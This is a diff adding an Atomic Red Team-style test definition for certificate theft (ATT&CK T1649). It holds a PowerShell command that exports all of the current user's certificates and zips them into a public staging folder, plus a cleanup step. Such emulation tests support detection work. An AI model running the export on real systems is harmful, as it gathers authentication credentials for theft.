@@ -1,0 +1,22 @@
+attack_technique: T1649
+display_name: 'Steal or Forge Authentication Certificates'
+atomic_tests:
+- name: Staging Local Certificates via Export-Certificate
+  auto_generated_guid: eb121494-82d1-4148-9e2b-e624e03fbf3d
+  description: |
+    Export all user certificates and add to a compressed archive.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $archive="$env:PUBLIC\T1649\atomic_certs.zip"
+      $exfilpath="$env:PUBLIC\T1649\certs"
+      Add-Type -assembly "system.io.compression.filesystem"
+      Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
+      mkdir $exfilpath | Out-Null
+      foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
+      [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
+    cleanup_command: |
+      $exfilpath="$env:PUBLIC\T1649\certs"
+      Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
+    name: powershell
